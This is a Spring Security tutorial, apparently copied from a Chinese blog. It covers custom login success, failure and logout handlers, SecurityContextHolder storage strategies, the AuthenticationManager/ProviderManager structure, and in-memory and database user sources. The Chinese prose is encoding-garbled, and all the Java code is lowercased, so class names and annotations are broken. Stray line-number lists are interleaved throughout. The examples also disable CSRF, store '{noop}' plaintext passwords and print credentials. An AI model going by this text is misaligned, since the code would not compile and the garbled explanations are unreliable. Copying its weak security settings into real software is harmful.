èªå®ä¹è®¤è¯æåå¤çå¨\n\npackage com.pwddd.springsecurity.config.security;\n\nimport com.fasterxml.jackson.databind.objectmapper;\nimport org.springframework.security.core.authentication;\nimport org.springframework.security.web.authentication.authenticationsuccesshandler;\n\nimport javax.servlet.servletexception;\nimport javax.servlet.http.httpservletrequest;\nimport javax.servlet.http.httpservletresponse;\nimport java.io.ioexception;\nimport java.util.hashmap;\n\npublic class customerauthenticationsuccesshandler implements authenticationsuccesshandler {\n    @override\n    public void onauthenticationsuccess(httpservletrequest request, httpservletresponse response, authentication authentication) throws ioexception, servletexception {\n        hashmap<string, object> hashmap = new hashmap<>();\n        hashmap.put("msg","ç»éæåï¼");\n        hashmap.put("code",200);\n        response.setcontenttype("application/json;charset=utf8");\n        string result = new objectmapper().writevalueasstring(hashmap);\n        response.getwriter().write(result);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# 1. éç½®èªå®ä¹å¤çå¨\n\n.successhandler(new customerauthenticationsuccesshandler())\n\n\n1\n\n\nè¿æ ·éç½®ä¹åï¼ç»éæåå°±ä¼ä½¿ç¨æä»¬æå®çè®¤è¯æåå¤çå¨ã\n\n\n\n\n# èªå®ä¹è®¤è¯å¤±è´¥å¤ç\n\n# é¡µé¢å±ç¤ºå¤±è´¥ä¿¡æ¯\n\nä¸ºäºè½æ´ç´è§å¨ç»å½é¡µé¢çå°å¼å¸¸éè¯¯ä¿¡æ¯ï¼å¯ä»¥å¨ç»å½é¡µé¢ä¸­ç´æ¥è·åå¼å¸¸ä¿¡æ¯ãspring security å¨ç»å½å¤±è´¥ä¹åä¼å°å¼å¸¸ä¿¡æ¯å­å¨å° request ãsessionä½ç¨åä¸­ key ä¸º spring_security_last_exception å½åå±æ§ä¸­ï¼æºç å¯ä»¥åè simpleurlauthenticationfailurehandler ï¼\n\n\n\næä»¬å¯ä»¥å¨ç»å½å¤±è´¥è·³è½¬é¡µé¢ä¸è·åç»å½å¤±è´¥ä¿¡æ¯ï¼ç¶åå±ç¤ºå°é¡µé¢ã\n\n# 0.è®¾ç½®é¡µé¢å±ç¤º\n\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8">\n    <title>ä¸»é¡µ</title>\n  </head>\n  <body>\n    <p th:text="${spring_security_last_exception}"></p>\n    <h1>hello world</h1>\n  </body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 1. è®¾ç½®éè¯¯è·³è½¬é¡µé¢\n\nè·³è½¬åæåè·³è½¬ä¸æ ·ï¼åä¸º\n\n * éå®åï¼éè¯¯ä¿¡æ¯å­å¨å°sessionåä¸­ï¼éè¦ä»sessionååã\n * è½¬åï¼éè¯¯ä¿¡æ¯å­å¨å°requeståä¸­ï¼éè¦ä»requestååã\n   * å¨è½¬åæ¶éè¦æ³¨æï¼ä¸è½ä½¿ç¨addviewcontrollerï¼å¦åä¼æ¥éï¼æ æ³è§£æpostè¯·æ±ã\n\n//                .failureurl("/index")  // éå®å\n.failureforwardurl("/login")  // è½¬å\n\n\n1\n2\n\n\nè®¾ç½®å®æä¹åï¼ç»å½å¤±è´¥å°±å¯ä»¥è·³è½¬å°æå®é¡µé¢ï¼å¹¶æ¾ç¤ºé¡µé¢ä¸çéè¯¯ä¿¡æ¯äºã\n\n# èªå®ä¹è®¤è¯å¤±è´¥å¤çå¨\n\nåä¸é¢çæåä¸æ ·ï¼ä¸ºäºéåååç«¯åç¦»ï¼ç»å½å¤±è´¥ä¹å¯ä»¥èªå®ä¹å¤±è´¥å¤çå¨ï¼è¿åä¸ä¸ªjsonç»åç«¯ã\n\n# 0. èªå®ä¹å¤±è´¥å¤çå¨\n\npackage com.pwddd.springsecurity.config.security;\n\nimport com.fasterxml.jackson.databind.objectmapper;\nimport org.springframework.security.core.authenticationexception;\nimport org.springframework.security.web.authentication.authenticationfailurehandler;\n\nimport javax.servlet.servletexception;\nimport javax.servlet.http.httpservletrequest;\nimport javax.servlet.http.httpservletresponse;\nimport java.io.ioexception;\nimport java.util.hashmap;\n\npublic class customerauthenticationfailurehandler implements authenticationfailurehandler {\n    @override\n    public void onauthenticationfailure(httpservletrequest request, httpservletresponse response, authenticationexception exception) throws ioexception, servletexception {\n        hashmap<string, object> hashmap = new hashmap<>();\n        hashmap.put("msg","è®¤è¯å¤±è´¥");\n        hashmap.put("code",400);\n        response.setcontenttype("application/json;charset=utf8");\n        string result = new objectmapper().writevalueasstring(hashmap);\n        response.getwriter().write(result);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# 1. éç½®è®¤è¯å¤±è´¥å¤çå¨\n\n.failurehandler(new customerauthenticationfailurehandler())\n\n\n1\n\n\n\n# èªå®ä¹æ³¨éå¤ç\n\nspring security ä¸­ä¹æä¾äºé»è®¤çæ³¨éç»å½éç½®ï¼å¨å¼åæ¶ä¹å¯ä»¥æç§èªå·±éæ±å¯¹æ³¨éè¿è¡ä¸ªæ§åå®å¶ãé»è®¤çæ³¨éè¯·æ±å°åä¸º/logoutï¼å æ­¤åªéè¦åégetè¯·æ±å°å½åçå°åå³å¯å®ææ³¨éã\n\n@configuration\npublic class websecurityconfigurer extends websecurityconfigureradapter {\n  @override\n  protected void configure(httpsecurity http) throws exception {\n    http.authorizehttprequests()\n      //...\n      .and()\n      .formlogin()\n      //...\n      .and()\n      .logout()\n      .logouturl("/logout")\n      .invalidatehttpsession(true)\n      .clearauthentication(true)\n      .logoutsuccessurl("/login.html")\n      .and()\n      .csrf().disable();//è¿éåå³é­ csrf\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n * éè¿ logout() æ¹æ³å¼å¯æ³¨ééç½®\n * logouturl æå®éåºç»å½è¯·æ±å°åï¼é»è®¤æ¯ get è¯·æ±ï¼è·¯å¾ä¸º /logout\n * invalidatehttpsession éåºæ¶æ¯å¦æ¯ session å¤±æï¼é»è®¤å¼ä¸º true\n * clearauthentication éåºæ¶æ¯å¦æ¸é¤è®¤è¯ä¿¡æ¯ï¼é»è®¤å¼ä¸º true\n * logoutsuccessurl éåºç»å½æ¶è·³è½¬å°å\n\nåæ¶ï¼spring securityä¹æä¾äºä¸ªæ§åå®å¶çå¯è½ï¼æ¯æéç½®å¤ä¸ªæ³¨éè¯·æ±å°åï¼åè¯·æ±æ¹å¼ãåæ¶ä¸ºäºæ´å¥½çééååç«¯åç¦»çç³»ç»ï¼æ¯æèªå®ä¹æ³¨éå¤çå¨ã\n\n@configuration\npublic class websecurityconfigurer extends websecurityconfigureradapter {\n\t\t@override\n    protected void configure(httpsecurity http) throws exception {\n        http.authorizehttprequests()\n                //...\n                .and()\n                .formlogin()\n                //...\n                .and()\n                .logout()\n                .logoutrequestmatcher(new orrequestmatcher(\n                        new antpathrequestmatcher("/logout1","get"),\n                        new antpathrequestmatcher("/logout","get")\n                ))\n                .invalidatehttpsession(true)\n                .clearauthentication(true)\n                .logoutsuccessurl("/login.html")\n                .and()\n                .csrf().disable();//è¿éåå³é­ csrf\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# èªå®ä¹æ³¨éå¤çå¨\n\npackage com.pwddd.springsecurity.config.security;\n\nimport com.fasterxml.jackson.databind.objectmapper;\nimport org.springframework.security.core.authentication;\nimport org.springframework.security.web.authentication.logout.logoutsuccesshandler;\n\nimport javax.servlet.servletexception;\nimport javax.servlet.http.httpservletrequest;\nimport javax.servlet.http.httpservletresponse;\nimport java.io.ioexception;\nimport java.util.hashmap;\n\npublic class customerlogoutsuccesshandler implements logoutsuccesshandler {\n    @override\n    public void onlogoutsuccess(httpservletrequest request, httpservletresponse response, authentication authentication) throws ioexception, servletexception {\n        hashmap<string, object> hashmap = new hashmap<>();\n        hashmap.put("code",200);\n        hashmap.put("msg","æ³¨éæåï¼");\n        string re = new objectmapper().writevalueasstring(hashmap);\n        response.setcontenttype("application/json;charset=utf8");\n        response.getwriter().write(re);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\néç½®å¤çå¨\n\n.logoutsuccesshandler(new customerlogoutsuccesshandler())\n\n\n1\n\n\n\n# ç»éæååçä¿¡æ¯è·å\n\n# securitycontextholder\n\nspring security ä¼å°ç»å½ç¨æ·æ°æ®ä¿å­å¨ session ä¸­ãä½æ¯ï¼ä¸ºäºä½¿ç¨æ¹ä¾¿,spring securityå¨æ­¤åºç¡ä¸è¿åäºä¸äºæ¹è¿ï¼å¶ä¸­æä¸»è¦çä¸ä¸ªååå°±æ¯çº¿ç¨ç»å®ãå½ç¨æ·ç»å½æåå,spring security ä¼å°ç»å½æåçç¨æ·ä¿¡æ¯ä¿å­å° securitycontextholder ä¸­ã\n\nsecuritycontextholder ä¸­çæ°æ®ä¿å­é»è®¤æ¯éè¿threadlocal æ¥å®ç°çï¼ä½¿ç¨ threadlocal åå»ºçåéåªè½è¢«å½åçº¿ç¨è®¿é®ï¼ä¸è½è¢«å¶ä»çº¿ç¨è®¿é®åä¿®æ¹ï¼ä¹å°±æ¯ç¨æ·æ°æ®åè¯·æ±çº¿ç¨ç»å®å¨ä¸èµ·ãå½ç»å½è¯·æ±å¤çå®æ¯åï¼spring security ä¼å° securitycontextholder ä¸­çæ°æ®æ¿åºæ¥ä¿å­å° session ä¸­ï¼åæ¶å° securitycontexholder ä¸­çæ°æ®æ¸ç©ºãä»¥åæ¯å½æè¯·æ±å°æ¥æ¶ï¼spring security å°±ä¼åä» session ä¸­ååºç¨æ·ç»å½æ°æ®ï¼ä¿å­å°securitycontextholder ä¸­ï¼æ¹ä¾¿å¨è¯¥è¯·æ±çåç»­å¤çè¿ç¨ä¸­ä½¿ç¨ï¼åæ¶å¨è¯·æ±ç»ææ¶å° securitycontextholder ä¸­çæ°æ®æ¿åºæ¥ä¿å­å° session ä¸­ï¼ç¶åå°securitycontextholder ä¸­çæ°æ®æ¸ç©ºã\n\nå®éä¸ securitycontextholder ä¸­å­å¨æ¯ securitycontextï¼å¨ securitycontext ä¸­å­å¨æ¯ authenticationã\n\n\n\nè¿ç§è®¾è®¡æ¯å¸åçç­ç¥è®¾è®¡æ¨¡å¼:\n\npublic class securitycontextholder {\n\tpublic static final string mode_threadlocal = "mode_threadlocal";\n\tpublic static final string mode_inheritablethreadlocal = "mode_inheritablethreadlocal";\n\tpublic static final string mode_global = "mode_global";\n\tprivate static final string mode_pre_initialized = "mode_pre_initialized";\n\tprivate static securitycontextholderstrategy strategy;\n  //....\n\tprivate static void initializestrategy() {\n\t\tif (mode_pre_initialized.equals(strategyname)) {\n\t\t\tassert.state(strategy != null, "when using " + mode_pre_initialized\n\t\t\t\t\t+ ", setcontextholderstrategy must be called with the fully constructed strategy");\n\t\t\treturn;\n\t\t}\n\t\tif (!stringutils.hastext(strategyname)) {\n\t\t\t// set default\n\t\t\tstrategyname = mode_threadlocal;\n\t\t}\n\t\tif (strategyname.equals(mode_threadlocal)) {\n\t\t\tstrategy = new threadlocalsecuritycontextholderstrategy();\n\t\t\treturn;\n\t\t}\n\t\tif (strategyname.equals(mode_inheritablethreadlocal)) {\n\t\t\tstrategy = new inheritablethreadlocalsecuritycontextholderstrategy();\n\t\t\treturn;\n\t\t}\n\t\tif (strategyname.equals(mode_global)) {\n\t\t\tstrategy = new globalsecuritycontextholderstrategy();\n\t\t\treturn;\n\t\t}\n    //.....\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n 1. mode threadlocalï¼è¿ç§å­æ¾ç­ç¥æ¯å° securitycontext å­æ¾å¨ threadlocalä¸­ï¼å¤§å®¶ç¥é threadlocal çç¹ç¹æ¯å¨åªä¸ªçº¿ç¨ä¸­å­å¨å°±è¦å¨åªä¸ªçº¿ç¨ä¸­è¯»åï¼è¿å¶å®éå¸¸éå web åºç¨ï¼å ä¸ºå¨é»è®¤æåµä¸ï¼ä¸ä¸ªè¯·æ±æ è®ºç»è¿å¤å° filter å°è¾¾ servletï¼é½æ¯ç±ä¸ä¸ªçº¿ç¨æ¥å¤ççãè¿ä¹æ¯ securitycontextholder çé»è®¤å­å¨ç­ç¥ï¼è¿ç§å­å¨ç­ç¥æå³çå¦æå¨å·ä½çä¸å¡å¤çä»£ç ä¸­ï¼å¼å¯äºå­çº¿ç¨ï¼å¨å­çº¿ç¨ä¸­å»è·åç»å½ç¨æ·æ°æ®ï¼å°±ä¼è·åä¸å°ã\n 2. mode inheritablethreadlocalï¼è¿ç§å­å¨æ¨¡å¼éç¨äºå¤çº¿ç¨ç¯å¢ï¼å¦æå¸æå¨å­çº¿ç¨ä¸­ä¹è½å¤è·åå°ç»å½ç¨æ·æ°æ®ï¼é£ä¹å¯ä»¥ä½¿ç¨è¿ç§å­å¨æ¨¡å¼ã\n 3. mode globalï¼è¿ç§å­å¨æ¨¡å¼å®éä¸æ¯å°æ°æ®ä¿å­å¨ä¸ä¸ªéæåéä¸­ï¼å¨ javawebå¼åä¸­ï¼è¿ç§æ¨¡å¼å¾å°ä½¿ç¨å°ã\n\n# securitycontextholderstrategy\n\néè¿ securitycontextholder å¯ä»¥å¾ç¥ï¼securitycontextholderstrategy æ¥å£ç¨æ¥å®ä¹å­å¨ç­ç¥æ¹æ³\n\npublic interface securitycontextholderstrategy {\n\tvoid clearcontext();\n\tsecuritycontext getcontext();\n\tvoid setcontext(securitycontext context);\n\tsecuritycontext createemptycontext();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\næ¥å£ä¸­ä¸å±å®ä¹äºåä¸ªæ¹æ³ï¼\n\n * clearcontextï¼è¯¥æ¹æ³ç¨æ¥æ¸é¤å­å¨ç securitycontextå¯¹è±¡ã\n * getcontextï¼è¯¥æ¹æ³ç¨æ¥è·åå­å¨ç securitycontext å¯¹è±¡ã\n * setcontextï¼è¯¥æ¹æ³ç¨æ¥è®¾ç½®å­å¨ç securitycontext å¯¹è±¡ã\n * create empty contextï¼è¯¥æ¹æ³åç¨æ¥åå»ºä¸ä¸ªç©ºç securitycontext å¯¹è±¡ã\n\n\n\nä»ä¸é¢å¯ä»¥çåºæ¯ä¸ä¸ªå®ç°ç±»å¯¹åºä¸ç§ç­ç¥çå®ç°ã\n\n# ä»£ç ä¸­è·åè®¤è¯ä¹åç¨æ·æ°æ®\n\n@restcontroller\npublic class hellocontroller {\n    @requestmapping("/hello")\n    public string hello() {\n      authentication authentication = securitycontextholder\n        .getcontext().getauthentication();\n      user principal = (user) authentication.getprincipal();\n      system.out.println("èº«ä»½ :"+principal.getusername());\n      system.out.println("å­è¯ :"+authentication.getcredentials());\n      system.out.println("æé :"+authentication.getauthorities());\n      return "hello security";\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# å¤çº¿ç¨æåµä¸è·åç¨æ·æ°æ®\n\n@restcontroller\npublic class hellocontroller {\n    @requestmapping("/hello")\n    public string hello() {\n      new thread(()->{\n        authentication authentication = securitycontextholder\n          .getcontext().getauthentication();\n        user principal = (user) authentication.getprincipal();\n        system.out.println("èº«ä»½ :"+principal.getusername());\n        system.out.println("å­è¯ :"+authentication.getcredentials());\n        system.out.println("æé :"+authentication.getauthorities());\n      }).start();\n      return "hello security";\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n\nå¯ä»¥çå°é»è®¤ç­ç¥ï¼æ¯æ æ³å¨å­çº¿ç¨ä¸­è·åç¨æ·ä¿¡æ¯ï¼å¦æéè¦å¨å­çº¿ç¨ä¸­è·åå¿é¡»ä½¿ç¨ç¬¬äºç§ç­ç¥ï¼é»è®¤ç­ç¥æ¯éè¿ system.getproperty å è½½çï¼å æ­¤æä»¬å¯ä»¥éè¿å¢å  vm options åæ°è¿è¡ä¿®æ¹ã\n\n-dspring.security.strategy=mode_inheritablethreadlocal\n\n\n1\n\n\n\n\n# é¡µé¢ä¸è·åç¨æ·ä¿¡æ¯\n\n * å¼å¥ä¾èµ\n   \n   <dependency>\n     <groupid>org.thymeleaf.extras</groupid>\n     <artifactid>thymeleaf-extras-springsecurity5</artifactid>\n     <version>3.0.4.release</version>\n   </dependency>\n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n\n * é¡µé¢å å¥å½åç©ºé´\n   \n   <html lang="en" xmlns:th="https://www.thymeleaf.org" \n   xmlns:sec="http://www.thymeleaf.org/extras/spring-security">\n   \n   \n   1\n   2\n   \n\n * é¡µé¢ä¸­ä½¿ç¨\n   \n   \x3c!--è·åè®¤è¯ç¨æ·å--\x3e\n   <ul>\n     <li sec:authentication="principal.username"></li>\n     <li sec:authentication="principal.authorities"></li>\n     <li sec:authentication="principal.accountnonexpired"></li>\n     <li sec:authentication="principal.accountnonlocked"></li>\n     <li sec:authentication="principal.credentialsnonexpired"></li>\n   </ul>\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   \n\n\n# èªå®ä¹è®¤è¯æ°æ®æº\n\n# è®¤è¯æµç¨åæ\n\nhttps://docs.spring.io/spring-security/reference/servlet/authentication/architecture.html\n\n\n\n * åèµ·è®¤è¯è¯·æ±ï¼è¯·æ±ä¸­æºå¸¦ç¨æ·åãå¯ç ï¼è¯¥è¯·æ±ä¼è¢«usernamepasswordauthenticationfilter æ¦æª\n * å¨usernamepasswordauthenticationfilterçattemptauthenticationæ¹æ³ä¸­å°è¯·æ±ä¸­ç¨æ·ååå¯ç ï¼å°è£ä¸ºauthenticationå¯¹è±¡ï¼å¹¶äº¤ç»authenticationmanager è¿è¡è®¤è¯\n * è®¤è¯æåï¼å°è®¤è¯ä¿¡æ¯å­å¨å° securitycontexthodler ä»¥åè°ç¨è®°ä½æç­ï¼å¹¶åè° authenticationsuccesshandler å¤ç\n * è®¤è¯å¤±è´¥ï¼æ¸é¤ securitycontexthodler ä»¥å è®°ä½æä¸­ä¿¡æ¯ï¼åè° authenticationfailurehandler å¤ç\n\n# ä¸èå³ç³»\n\nä»ä¸é¢åæä¸­å¾ç¥ï¼authenticationmanager æ¯è®¤è¯çæ ¸å¿ç±»ï¼ä½å®éä¸å¨åºå±çæ­£è®¤è¯æ¶è¿ç¦»ä¸å¼ providermanager ä»¥å authenticationprovider ãä»ä»¬ä¸èå³ç³»æ¯æ ·çå¢ï¼\n\n * authenticationmanager æ¯ä¸ä¸ªè®¤è¯ç®¡çå¨ï¼å®å®ä¹äº spring security è¿æ»¤å¨è¦æ§è¡è®¤è¯æä½ã\n * providermanager authenticationmanageræ¥å£çå®ç°ç±»ãspring security è®¤è¯æ¶é»è®¤ä½¿ç¨å°±æ¯ providermanagerã\n * authenticationprovider å°±æ¯éå¯¹ä¸åçèº«ä»½ç±»åæ§è¡çå·ä½çèº«ä»½è®¤è¯ã\n\nauthenticationmanager ä¸ providermanager\n\n\n\nprovidermanager æ¯ authenticationmanager çå¯ä¸å®ç°ï¼ä¹æ¯ spring security é»è®¤ä½¿ç¨å®ç°ãä»è¿éä¸é¾çåºé»è®¤æåµä¸authenticationmanager å°±æ¯ä¸ä¸ªprovidermanagerã\n\nprovidermanager ä¸ authenticationprovider\n\næèªå®æ¹: https://docs.spring.io/spring-security/reference/servlet/authentication/architecture.html\n\n\n\nå¨ spring seourity ä¸­ï¼åè®¸ç³»ç»åæ¶æ¯æå¤ç§ä¸åçè®¤è¯æ¹å¼ï¼ä¾å¦åæ¶æ¯æç¨æ·å/å¯ç è®¤è¯ãreremberme è®¤è¯ãææºå·ç å¨æè®¤è¯ç­ï¼èä¸åçè®¤è¯æ¹å¼å¯¹åºäºä¸åçauthenticationproviderï¼æä»¥ä¸ä¸ªå®æ´çè®¤è¯æµç¨å¯è½ç±å¤ä¸ªauthenticationprovideræ¥æä¾ã\n\nå¤ä¸ª authenticationprovider å°ç»æä¸ä¸ªåè¡¨ï¼è¿ä¸ªåè¡¨å°ç± providermanager ä»£çãæ¢å¥è¯è¯´ï¼å¨providermanager ä¸­å­å¨ä¸ä¸ª authenticationprovider åè¡¨ï¼å¨provider manager ä¸­éååè¡¨ä¸­çæ¯ä¸ä¸ªauthenticationprovider å»æ§è¡èº«ä»½è®¤è¯ï¼æç»å¾å°è®¤è¯ç»æã\n\nprovidermanager æ¬èº«ä¹å¯ä»¥åéç½®ä¸ä¸ª authenticationmanagerä½ä¸º parentï¼è¿æ ·å½providermanagerè®¤è¯å¤±è´¥ä¹åï¼å°±å¯ä»¥è¿å¥å° parent ä¸­åæ¬¡è¿è¡è®¤è¯ãçè®ºä¸æ¥è¯´ï¼providermanager ç parent å¯ä»¥æ¯ä»»æç±»åçauthenticationmanagerï¼ä½æ¯éå¸¸é½æ¯ç± providermanageræ¥æ®æ¼ parent çè§è²ï¼ä¹å°±æ¯providermanageræ¯ providermanagerç parentã\n\nprovidermanageræ¬èº«ä¹å¯ä»¥æå¤ä¸ªï¼å¤ä¸ªprovidermanager å±ç¨åä¸ä¸ª parentãææ¶ï¼ä¸ä¸ªåºç¨ç¨åºæåä¿æ¤èµæºçé»è¾ç»ï¼ä¾å¦ï¼ææç¬¦åè·¯å¾æ¨¡å¼çç½ç»èµæºï¼å¦/api/**ï¼ï¼æ¯ä¸ªç»å¯ä»¥æèªå·±çä¸ç¨ authenticationmanagerãéå¸¸ï¼æ¯ä¸ªç»é½æ¯ä¸ä¸ªprovidermanagerï¼å®ä»¬å±äº«ä¸ä¸ªç¶çº§ãç¶åï¼ç¶çº§æ¯ä¸ç§ å¨å±èµæºï¼ä½ä¸ºæææä¾èçåå¤èµæºã\n\næ ¹æ®ä¸é¢çä»ç»ï¼æä»¬ç»åºæ°ç authenticationmanagerãprovidemanager å authentictionproviderå³ç³»\n\næèªå®ç½: https://spring.io/guides/topicals/spring-security-architecture\n\n\n\nå¼æ¸æ¥è®¤è¯åçä¹åæä»¬æ¥çä¸å·ä½è®¤è¯æ¶æ°æ®æºçè·åã**é»è®¤æåµä¸ authenticationprovider æ¯ç± daoauthenticationprovider ç±»æ¥å®ç°è®¤è¯çï¼å¨daoauthenticationprovider è®¤è¯æ¶åéè¿ userdetailsservice å®ææ°æ®æºçæ ¡éªã**ä»ä»¬ä¹é´è°ç¨å³ç³»å¦ä¸ï¼\n\n\n\næ»ç»: authenticationmanager æ¯è®¤è¯ç®¡çå¨ï¼å¨ spring security ä¸­æå¨å±authenticationmanagerï¼ä¹å¯ä»¥æå±é¨authenticationmanagerãå¨å±çauthenticationmanagerç¨æ¥å¯¹å¨å±è®¤è¯è¿è¡å¤çï¼å±é¨çauthenticationmanagerç¨æ¥å¯¹æäºç¹æ®èµæºè®¤è¯å¤çãå½ç¶æ è®ºæ¯å¨å±è®¤è¯ç®¡çå¨è¿æ¯å±é¨è®¤è¯ç®¡çå¨é½æ¯ç± providermanger è¿è¡å®ç°ã æ¯ä¸ä¸ªprovidermangerä¸­é½ä»£çä¸ä¸ªauthenticationproviderçåè¡¨ï¼åè¡¨ä¸­æ¯ä¸ä¸ªå®ç°ä»£è¡¨ä¸ç§èº«ä»½è®¤è¯æ¹å¼ãè®¤è¯æ¶åºå±æ°æ®æºéè¦è°ç¨ userdetailservice æ¥å®ç°ã\n\n# éç½®å¨å± authenticationmanager\n\nhttps://spring.io/guides/topicals/spring-security-architecture\n\né»è®¤çå¨å± authenticationmanager\n\n@configuration\npublic class websecurityconfigurer extends websecurityconfigureradapter {\n  @autowired\n  public void initialize(authenticationmanagerbuilder builder) {\n    //builder..\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * springboot å¯¹ security è¿è¡èªå¨éç½®æ¶èªå¨å¨å·¥åä¸­åå»ºä¸ä¸ªå¨å±authenticationmanager\n\næ»ç»\n\n 1. é»è®¤èªå¨éç½®åå»ºå¨å±authenticationmanager é»è®¤æ¾å½åé¡¹ç®ä¸­æ¯å¦å­å¨èªå®ä¹ userdetailservice å®ä¾ èªå¨å°å½åé¡¹ç® userdetailservice å®ä¾è®¾ç½®ä¸ºæ°æ®æº\n 2. é»è®¤èªå¨éç½®åå»ºå¨å±authenticationmanager å¨å·¥åä¸­ä½¿ç¨æ¶ç´æ¥å¨ä»£ç ä¸­æ³¨å¥å³å¯\n\nèªå®ä¹å¨å± authenticationmanager\n\n@configuration\npublic class websecurityconfigurer extends websecurityconfigureradapter {\n  @override\n  public void configure(authenticationmanagerbuilder builder) {\n  \t//builder ....\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\næ»ç»\n\n 1. ä¼å°å·¥åä¸­èªå¨éç½®authenticationmanager è¿è¡è¦ç\n 2. éè¦å¨å®ç°ä¸­æå®è®¤è¯æ°æ®æºå¯¹è±¡ userdetaiservice å®ä¾\n 3. è¿ç§æ¹å¼åå»ºauthenticationmanagerå¯¹è±¡å·¥ååé¨æ¬å°ä¸ä¸ª authenticationmanager å¯¹è±¡ ä¸åè®¸å¨å¶ä»èªå®ä¹ç»ä»¶ä¸­è¿è¡æ³¨å¥\n\nç¨æ¥å¨å·¥åä¸­æ´é²èªå®ä¹authenticationmanager å®ä¾\n\n@configuration\npublic class websecurityconfigurer extends websecurityconfigureradapter {\n  \n    //1.èªå®ä¹authenticationmanager  æ¨è  å¹¶æ²¡æå¨å·¥åä¸­æ´é²åºæ¥\n    @override\n    public void configure(authenticationmanagerbuilder builder) throws exception {\n        system.out.println("èªå®ä¹authenticationmanager: " + builder);\n        builder.userdetailsservice(userdetailsservice());\n    }\n\n    //ä½ç¨: ç¨æ¥å°èªå®ä¹authenticationmanagerå¨å·¥åä¸­è¿è¡æ´é²,å¯ä»¥å¨ä»»ä½ä½ç½®æ³¨å¥\n    @override\n    @bean\n    public authenticationmanager authenticationmanagerbean() throws exception {\n        return super.authenticationmanagerbean();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# èªå®ä¹åå­æ°æ®æº\n\n@configuration\npublic class websecurityconfigurer extends websecurityconfigureradapter {\n\n    @bean\n    public userdetailsservice userdetailsservice(){\n        inmemoryuserdetailsmanager inmemoryuserdetailsmanager\n                = new inmemoryuserdetailsmanager();\n        userdetails u1 = user.withusername("zhangs")\n                .password("{noop}111").roles("user").build();\n        inmemoryuserdetailsmanager.createuser(u1);\n        return inmemoryuserdetailsmanager;\n    }\n\n    @override\n    protected void configure(authenticationmanagerbuilder auth) \n      throws exception {\n        auth.userdetailsservice(userdetailsservice());\n    }  \t\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# èªå®ä¹æ°æ®åºæ°æ®æº\n\næ°æ®åºæ°æ®è¡¨è®¾è®¡\n\n-- ç¨æ·è¡¨\ncreate table `user`\n(\n    `id`                    int(11) not null auto_increment,\n    `username`              varchar(32)  default null,\n    `password`              varchar(255) default null,\n    `enabled`               tinyint(1) default null,\n    `accountnonexpired`     tinyint(1) default null,\n    `accountnonlocked`      tinyint(1) default null,\n    `credentialsnonexpired` tinyint(1) default null,\n    primary key (`id`)\n) engine=innodb auto_increment=4 default charset=utf8;\n-- è§è²è¡¨\ncreate table `role`\n(\n    `id`      int(11) not null auto_increment,\n    `name`    varchar(32) default null,\n    `name_zh` varchar(32) default null,\n    primary key (`id`)\n) engine=innodb auto_increment=4 default charset=utf8;\n-- ç¨æ·è§è²å³ç³»è¡¨\ncreate table `user_role`\n(\n    `id`  int(11) not null auto_increment,\n    `uid` int(11) default null,\n    `rid` int(11) default null,\n    primary key (`id`),\n    key   `uid` (`uid`),\n    key   `rid` (`rid`)\n) engine=innodb auto_increment=5 default charset=utf8;\n\n-- æå¥ç¨æ·æ°æ®\nbegin;\n  insert into `user`\n  values (1, \'root\', \'{noop}123\', 1, 1, 1, 1);\n  insert into `user`\n  values (2, \'admin\', \'{noop}123\', 1, 1, 1, 1);\n  insert into `user`\n  values (3, \'blr\', \'{noop}123\', 1, 1, 1, 1);\ncommit;\n-- æå¥è§è²æ°æ®\nbegin;\n  insert into `role`\n  values (1, \'role_product\', \'ååç®¡çå\');\n  insert into `role`\n  values (2, \'role_admin\', \'ç³»ç»ç®¡çå\');\n  insert into `role`\n  values (3, \'role_user\', \'ç¨æ·ç®¡çå\');\ncommit;\n-- æå¥ç¨æ·è§è²æ°æ®\nbegin;\n  insert into `user_role`\n  values (1, 1, 1);\n  insert into `user_role`\n  values (2, 1, 2);\n  insert into `user_role`\n  values (3, 2, 2);\n  insert into `user_role`\n  values (4, 3, 3);\ncommit;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\nåå»ºå¯¹åºçå®ä½ç±»å¯¹è±¡\n\npackage com.pwddd.springsecurity.entity;\n\nimport lombok.allargsconstructor;\nimport lombok.data;\nimport lombok.noargsconstructor;\nimport org.springframework.security.core.grantedauthority;\nimport org.springframework.security.core.authority.simplegrantedauthority;\nimport 